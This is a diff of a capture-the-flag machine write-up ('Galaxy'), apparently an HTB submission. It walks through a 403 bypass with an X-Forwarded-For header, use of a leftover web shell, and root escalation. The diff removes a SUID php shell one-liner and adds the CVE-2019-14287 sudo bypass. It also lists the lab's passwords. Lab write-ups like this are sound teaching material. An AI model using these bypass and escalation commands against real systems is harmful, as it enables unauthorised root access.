@@ -2,7 +2,7 @@
 
 ## Introduction
 
-Galaxy is easy level machine In this challenge, machine hosting a beta website about facts. The site was vulnerable to bypassing the 403 Forbidden restriction using the X-Forwarded-For header. After successfully bypassing 403 restriction we can see devs left webshell which uses custom web user after user shell enumeration leads us to php which has suid bit permission
+Galaxy is easy level machine In this challenge, machine hosting a beta website about cosmic facts. The site was vulnerable to bypassing the 403 Forbidden restriction using the X-Forwarded-For header. After successfully bypassing 403 restriction we can see devs left webshell which uses custom web user after user enumeration we can find box vulnerable to CVE-2019-14287 
 ## Info for HTB
 
 ### Access
@@ -11,15 +11,16 @@ Passwords:
 
 | User  | Password                            |
 | ----- | ----------------------------------- |
-| web | 1203a |
+| web | Ab401c |
 | root  | root8618 |
 
 ### Key Processes
 
 1) SSH server on 22 port
 2) Apache2 server on 80 port which is vulnerable to http host header
-3) There is web shell in /developers directory
-4) php has suid bit permission
+3) There is web shell in /developers directory (in story web site is in beta situation devs unaware of http-header vulnerabilit)
+4) For root privilege escalation I set CVE-2019-14287 it is from real world and I believe it suits to box story
+5) There is other user besides `web` and `root` (john  lily  tom) and they are dummy users to simulate developers environment and they are shouldn't be rabbit hole because there is nothing there and player will immediatly understand the privelege escalation if they see outdated sudo version (I am okay if htb devs wants to remove them)
 
 ### Automation / Crons
 There is no automation
@@ -65,11 +66,12 @@ Let's enumerate directories and subdirectories using ffuf tool:<br>
 ffuf -u http://galaxy.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 ```
 <br>
-We find /developers and /photos directories and /developers directory gives us 403 forbidden error<br>
+We find /developers and /photos directories and we are not allowed to access /developers directory<br>
 
-![image](https://github.com/user-attachments/assets/27c54f85-4952-4b13-8040-9c07dea34883)
+![image](https://github.com/user-attachments/assets/9e1c6a0c-dd6f-4836-85e4-a83ed47ad8f6)
+
 <br>
-Trying to enumerate any subdomains other directory leads us nothing. So we try to find a way to access /developers directory.<br>
+This message gives idea that maybe developers should be from internal network? Trying to enumerate any subdomains other directory leads us nothing. So we try to find a way to access /developers directory.<br>
 Googling 403 bypass error we find [this](https://github.com/justdoston/403-Bypass) documentation.<br>
 According to documentation trying to add forward headers with 127.0.0.1 ip will work, because server will think user trying to access from internal IP address.<br>
 
@@ -139,37 +141,34 @@ $
 user flag can be found in web home directory.<br>
 
 # Privilege Escalation
-After a long enumeration files with suid bit permission worth to pay attention:
+There is README.md file which admin left message to others!
+````
+Dear developers!
 
+We need to finish our beta test as fast as possible, for more comfortable evnironment I made other user accessible from web user!
+Please do not store any sensitive information ! This is office working computers!
 ````
-$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
--rwsr-xr-x+ 1 root root 5779920 Dec  2 12:36 /usr/bin/php8.3
--rwsr-xr-x 1 root root 72792 May 30  2024 /usr/bin/chfn
--rwsr-xr-x 1 root root 277936 Apr  8  2024 /usr/bin/sudo
--rwsr-xr-x+ 1 root root 137776 Apr  8  2024 /usr/bin/diff
--rwsr-xr-x 1 root root 51584 Aug  9 02:33 /usr/bin/mount
--rwsr-xr-x 1 root root 55680 Aug  9 02:33 /usr/bin/su
--rwsr-xr-x 1 root root 40664 May 30  2024 /usr/bin/newgrp
--rwsr-xr-x 1 root root 76248 May 30  2024 /usr/bin/gpasswd
--rwsr-xr-x 1 root root 64152 May 30  2024 /usr/bin/passwd
--rwsr-xr-x 1 root root 39296 Aug  9 02:33 /usr/bin/umount
--rwsr-xr-x 1 root root 44760 May 30  2024 /usr/bin/chsh
--rwsr-xr-x 1 root root 39296 Apr  8  2024 /usr/bin/fusermount3
--rwsr-xr-- 1 root messagebus 34960 Aug  9 02:33 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
--rwsr-xr-x 1 root root 18736 Apr  3  2024 /usr/lib/polkit-1/polkit-agent-helper-1
--rwsr-xr-x 1 root root 163112 Oct 11 08:05 /usr/lib/snapd/snap-confine
--rwsr-xr-x 1 root root 342632 Aug  9 02:33 /usr/lib/openssh/ssh-keysign
+After enumeration we can find user web allowed to user /usr/bin/bash as any user except root since it confirms we can use it for other users:
 ````
-Because php has suid bit permission if we browse to gtfobins we can  escalate privilege:
+User web may run the following commands on galaxy:
+    (ALL, !root) NOPASSWD: /usr/bin/bash
+````
+This means we can use `bash` as other user to access like: `sudo -u john /usr/bin/bash` but sudo forbids if we try to access `root` because of `!root`
+Searching other users directory we find nothing but we should pay attention to sudo version:
+````
+$ sudo -V
+Sudo version 1.8.27
+Sudoers policy plugin version 1.8.27
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.27
+````
+This not latest sudo version and after searching from databases we find this version is vulnerable to CVE-2019-14287.<br>
+According to [this](https://www.exploit-db.com/exploits/47502) documentation we can bypass using:
+````
+sudo -u#-1 /usr/bin/bash
+````
+![image](https://github.com/user-attachments/assets/159f07e4-7200-401b-b264-12246a61181c)
 <br>
-![image](https://github.com/user-attachments/assets/ce6fe95d-27bc-4493-9627-fdedd8aeeeca)
+Here wee can see trying to directly access to the root user didn't work but as expected we can bypass it!
 
-````
-$ /usr/bin/php8.3 -r "pcntl_exec('/bin/sh', ['-p']);"
-# id
-uid=1004(web) gid=1004(web) euid=0(root) groups=1004(web)
-# whoami
-root
-#
-````
-Now we have root shell, root flag can be found in /root directory
+
